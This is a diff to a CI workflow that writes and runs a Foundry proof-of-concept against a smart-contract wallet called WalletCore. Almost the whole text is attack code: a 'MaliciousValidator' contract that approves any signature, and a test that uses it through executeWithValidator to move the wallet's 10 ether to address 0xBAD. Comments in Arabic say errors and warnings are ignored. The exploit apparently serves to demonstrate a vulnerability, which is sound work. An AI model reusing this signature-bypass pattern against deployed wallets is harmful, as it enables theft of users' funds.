@@ -12,7 +12,44 @@ jobs:
       - name: Install Foundry
         uses: foundry-rs/foundry-toolchain@v1
 
-      - name: Force Run Exploit Test
+      - name: Run Exploit
         run: |
-          # سنتخطى أي اختبارات تنسيق أو Linting ونشغل الاختبار مباشرة
-          forge test --match-path test/exploit/SignatureBypass.t.sol -vvv
+          # 1. إنشاء الـ Validator الخبيث في مجلد التست مباشرة
+          cat > test/MaliciousValidator.sol <<EOF
+          pragma solidity ^0.8.23;
+          contract MaliciousValidator {
+              function validate(bytes32, bytes calldata) external pure returns (bool) { return true; }
+              function readAndUpdateNonce(address) external pure returns (uint256) { return 0; }
+          }
+          EOF
+
+          # 2. إنشاء ملف الاختبار البسيط
+          cat > test/ExploitFinal.t.sol <<EOF
+          pragma solidity ^0.8.23;
+          import "forge-std/Test.sol";
+          import "../src/WalletCore.sol";
+          import "./MaliciousValidator.sol";
+          import "../src/Types.sol";
+
+          contract ExploitFinal is Test {
+              WalletCore wallet;
+              function setUp() public {
+                  wallet = new WalletCore(address(0x1), "OKX", "1.0.0");
+                  vm.deal(address(wallet), 10 ether);
+              }
+              function testSignatureBypass() public {
+                  MaliciousValidator m = new MaliciousValidator();
+                  Call[] memory c = new Call[](1);
+                  c[0] = Call({target: address(0xBAD), value: 10 ether, data: ""});
+                  
+                  wallet.executeWithValidator(c, address(m), hex"00");
+                  
+                  assertEq(address(0xBAD).balance, 10 ether);
+              }
+          }
+          EOF
+
+          # 3. التشغيل مع تجاهل التحذيرات والأخطاء الجانبية
+          forge test --match-path test/ExploitFinal.t.sol -vvv --no-compile
+          # إذا فشل الأمر أعلاه جرب بدون --no-compile
+          forge test --match-path test/ExploitFinal.t.sol -vvv
